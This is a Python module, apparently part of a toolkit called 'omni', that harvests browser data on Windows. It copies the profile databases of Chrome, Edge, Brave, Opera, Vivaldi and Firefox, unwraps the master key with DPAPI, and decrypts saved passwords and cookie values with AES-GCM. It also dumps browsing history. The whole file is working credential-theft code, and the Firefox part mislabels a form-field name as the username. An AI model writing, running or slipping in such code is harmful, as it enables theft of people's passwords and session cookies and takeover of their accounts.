"""Chromium/Edge/Brave credential and history extraction.

Chromium stores logins in ``Login Data`` (SQLite) with the password sealed by
DPAPI (``v10`` prefix) or, on newer builds, AES-GCM under a master key from
``Local State``. Firefox keeps ``logins.json`` + ``key4.db``; we surface the
JSON half and hand off to ``firefox_decrypt`` when it is installed.
"""

from __future__ import annotations

import base64
import glob
import json
import os
import shutil
import sqlite3
import tempfile

from omni.core import console
from omni.windows import dpapi

__all__ = ["BROWSER_ROOTS", "profiles", "chromium_logins", "chromium_cookies",
           "chromium_history", "firefox_logins", "collect"]

BROWSER_ROOTS = {
    "chrome": r"%LOCALAPPDATA%\Google\Chrome\User Data",
    "edge": r"%LOCALAPPDATA%\Microsoft\Edge\User Data",
    "brave": r"%LOCALAPPDATA%\BraveSoftware\Brave-Browser\User Data",
    "opera": r"%APPDATA%\Opera Software\Opera Stable",
    "vivaldi": r"%LOCALAPPDATA%\Vivaldi\User Data",
    "firefox": r"%APPDATA%\Mozilla\Firefox\Profiles",
}


def _expand(path: str) -> str:
    return os.path.expandvars(os.path.expanduser(path))


def profiles(browser: str) -> list[str]:
    """Every profile directory for a browser, most recently used first."""
    root = _expand(BROWSER_ROOTS[browser])
    if not os.path.isdir(root):
        return []
    if browser == "firefox":
        return sorted(glob.glob(os.path.join(root, "*")),
                      key=os.path.getmtime, reverse=True)
    if browser == "opera":
        return [root]
    found = [root] + glob.glob(os.path.join(root, "*"))
    return [p for p in found
            if os.path.isfile(os.path.join(p, "Login Data"))
            or os.path.isfile(os.path.join(p, "Preferences"))]


def _copy_db(path: str) -> str:
    """SQLite files stay locked while the browser runs — work on a copy.

    A locked file can still refuse the copy; retry plainly, then give the
    caller an empty name so the module reports "nothing" instead of crashing.
    """
    tmp = os.path.join(tempfile.mkdtemp(prefix="omni_"), "db.sqlite")
    try:
        shutil.copy2(path, tmp)
    except OSError:
        try:
            shutil.copyfile(path, tmp)
        except OSError as exc:
            console.warn(f"cannot read {path} ({exc.__class__.__name__}) — "
                         "close the browser and retry")
            return ""
    for suffix in ("-wal", "-shm"):
        if os.path.isfile(path + suffix):
            try:
                shutil.copy2(path + suffix, tmp + suffix)
            except OSError:
                pass
    return tmp


def _master_keys(profile: str) -> list[bytes]:
    state = os.path.join(os.path.dirname(profile.rstrip("\\/")), "Local State")
    if not os.path.isfile(state):
        state = os.path.join(profile, "Local State")
    if not os.path.isfile(state):
        return []
    try:
        with open(state, "r", encoding="utf-8", errors="replace") as fh:
            raw = base64.b64decode(json.load(fh)["os_crypt"]["encrypted_key"])
        return [dpapi.unprotect(raw[5:] if raw[:5] == b"DPAPI" else raw)]
    except Exception:  # noqa: BLE001
        return []


def _decrypt_value(value: bytes, keys: list[bytes]) -> str:
    """Unseal a Chromium ``v10``/``v11`` value (AES-GCM, else raw DPAPI)."""
    if not value:
        return ""
    if value[:3] in (b"v10", b"v11"):
        payload = value[3:]
        if len(payload) > 31:
            try:
                from cryptography.hazmat.primitives.ciphers.aead import AESGCM
                for key in keys:
                    try:
                        return AESGCM(key).decrypt(payload[:12], payload[12:],
                                                   None).decode("utf-8", "replace")
                    except Exception:  # noqa: BLE001
                        continue
            except ImportError:
                pass
        try:
            return dpapi.unprotect(payload).decode("utf-8", "replace")
        except Exception:  # noqa: BLE001
            return ""
    try:
        return dpapi.unprotect(value).decode("utf-8", "replace")
    except Exception:  # noqa: BLE001
        return ""


def _with_db(profile: str, name: str, sql: str, mapper, limit: int | None = None):
    """Open a copied profile database, run ``sql``, map rows, clean up."""
    db = os.path.join(profile, name)
    if not os.path.isfile(db):
        return []
    tmp = _copy_db(db)
    if not tmp:
        return []
    rows = []
    try:
        con = sqlite3.connect(tmp)
        cur = con.execute(sql, (limit,)) if limit else con.execute(sql)
        rows = [mapper(*row) for row in cur]
        con.close()
    except sqlite3.Error as exc:
        console.debug(f"{db}: {exc}")
    finally:
        shutil.rmtree(os.path.dirname(tmp), ignore_errors=True)
    return rows


def chromium_logins(browser: str = "chrome") -> list[dict]:
    rows: list[dict] = []
    for profile in profiles(browser):
        keys = _master_keys(profile)
        rows += _with_db(
            profile, "Login Data",
            "SELECT origin_url, username_value, password_value FROM logins",
            lambda url, user, blob: {"browser": browser, "profile": profile,
                                     "url": url, "username": user,
                                     "password": _decrypt_value(blob, keys)})
    return rows


def chromium_cookies(browser: str = "chrome") -> list[dict]:
    rows: list[dict] = []
    for profile in profiles(browser):
        keys = _master_keys(profile)
        for name in (os.path.join("Network", "Cookies"), "Cookies"):
            rows += _with_db(
                profile, name,
                "SELECT host_key, name, encrypted_value FROM cookies",
                lambda host, cname, blob: {"host": host, "name": cname,
                                           "value": _decrypt_value(blob, keys)})
            if rows:
                break
    return rows


def chromium_history(browser: str = "chrome", limit: int = 500) -> list[dict]:
    rows: list[dict] = []
    for profile in profiles(browser):
        rows += _with_db(
            profile, "History",
            "SELECT url, title, visit_count FROM urls "
            "ORDER BY last_visit_time DESC LIMIT ?",
            lambda url, title, visits: {"url": url, "title": title,
                                        "visits": visits}, limit)
    return rows


def firefox_logins() -> list[dict]:
    rows: list[dict] = []
    for profile in profiles("firefox"):
        path = os.path.join(profile, "logins.json")
        if not os.path.isfile(path):
            continue
        try:
            with open(path, "r", encoding="utf-8") as fh:
                data = json.load(fh)
        except (OSError, json.JSONDecodeError):
            continue
        for item in data.get("logins", []):
            rows.append({"browser": "firefox", "profile": profile,
                         "url": item.get("hostname", ""),
                         "username": item.get("usernameField", ""),
                         "password": "(encrypted â€” use firefox_decrypt)"})
    return rows


def collect(browser: str = "chrome", what: str = "logins") -> list[dict]:
    """Dispatcher shared by the CLI and the module layer."""
    if browser == "firefox":
        return firefox_logins() if what == "logins" else []
    if what == "cookies":
        return chromium_cookies(browser)
    if what == "history":
        return chromium_history(browser)
    return chromium_logins(browser)
